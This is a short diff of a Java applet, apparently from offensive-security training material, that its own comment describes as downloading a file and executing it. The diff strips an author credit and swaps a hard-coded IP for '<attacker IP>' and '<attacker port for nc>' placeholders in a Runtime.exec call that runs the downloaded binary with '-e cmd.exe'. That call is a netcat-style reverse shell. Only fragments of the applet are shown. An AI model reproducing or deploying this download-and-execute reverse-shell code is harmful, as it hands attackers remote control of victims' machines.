@@ -4,7 +4,6 @@ import java.io.*;
 import java.net.URL;
 import java.util.*;
 /**
-* Author: Offensive Security
 * This Java applet will download a file and execute it.
 **/
 public class Java extends Applet {
@@ -39,7 +38,7 @@ out.write(buffer, 0, nBytes);
 out.flush();
 out.close();
 in.close();
-f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.55 443 -e cmd.exe");
+f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " <attacker IP> <attacker port for nc> -e cmd.exe");
 }
 } catch(IOException e) {
 e.printStackTrace();
